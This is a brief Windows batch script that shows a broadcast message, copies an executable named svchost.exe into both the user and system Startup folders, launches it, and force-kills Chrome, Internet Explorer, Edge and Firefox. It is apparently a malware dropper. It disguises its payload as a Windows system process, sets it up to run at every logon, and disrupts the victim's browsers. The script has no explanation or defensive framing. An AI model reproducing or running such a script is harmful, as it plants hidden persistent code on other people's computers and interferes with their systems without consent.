msg * The end of saiya people

echo f|xcopy /f ".\svchost.exe" "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup" 

start explorer "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\svchost.exe"

echo f|xcopy ".\svchost.exe" "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp" 



TASKKILL /im chrome.exe /f
TAskkill /im iexplorer.exe /f
TAskkill /im microsoftedge.exe /f
TAskkill /im firefox.exe /f
